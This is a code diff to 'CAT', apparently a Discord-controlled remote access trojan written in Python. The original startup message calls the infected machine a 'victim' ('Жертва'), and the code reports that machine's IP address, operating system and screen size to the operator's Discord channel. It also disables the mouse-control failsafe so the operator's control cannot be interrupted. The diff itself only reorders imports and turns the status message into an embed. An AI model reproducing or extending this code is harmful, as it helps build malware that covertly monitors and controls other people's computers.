@@ -4,19 +4,19 @@ Jo to our telegram group https://t.me/catchatdev
 Made by NullifiedVlad (C) 2020
 """
 
+import ctypes
+import os
+import subprocess
+import sys
+from datetime import datetime
+
 # Импорт библиотек
 import discord
-from discord.ext import commands
 import pyautogui as pg
-import os
-import sys
-import subprocess
+from discord.ext import commands
+
 import config
-from datetime import datetime
-from gtts import gTTS
-from playsound import playsound
 import nullfunction as nf
-import ctypes
 
 pg.FAILSAFE = False  # делает невозможным прервать движение мышки
 bot = commands.Bot(command_prefix='/')  # префикс для комманд
@@ -29,13 +29,17 @@ async def on_ready():
     channel_start = bot.get_channel(config.channel)
     date = datetime.now()
     x, y = pg.size()
-    await channel_start.send(
-        f'''CAT: **Жертва онлайн!** 
-Время запука **{date.hour}:{date.minute}**
-ОС: **{sys.platform}**
-Разрешение экрана: **{x}x{y}** 
-IP: **{nf.ip()}** 
-Напишите **/help** для справки!''')
+    embed = discord.Embed(title='**ПОЛЬЗОВАТЕЛЬ ОНЛАЙН**', description='CAT', color=0x03fcec, )
+
+    embed.add_field(name='**Время запука**', value=f'{date.hour}:{date.minute}', inline=False)
+    embed.add_field(name='**ОС**', value=f'{sys.platform}', inline=False)
+    embed.add_field(name='**Разрешение экрана**', value=f'{x}x{y}', inline=False)
+    embed.add_field(name='**IP адрес**', value=f'{nf.ip()}', inline=False)
+    embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
+    embed.set_footer(text=f'Используйте /help для справки!',
+                     icon_url='https://i.imgur.com/YbYKL0F.png')
+    embed.set_author(name=bot.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')
+    await channel_start.send(embed=embed)
     await bot.change_presence(activity=discord.Game(f'Был запущен в {date.hour}:{date.minute}'))
 
 
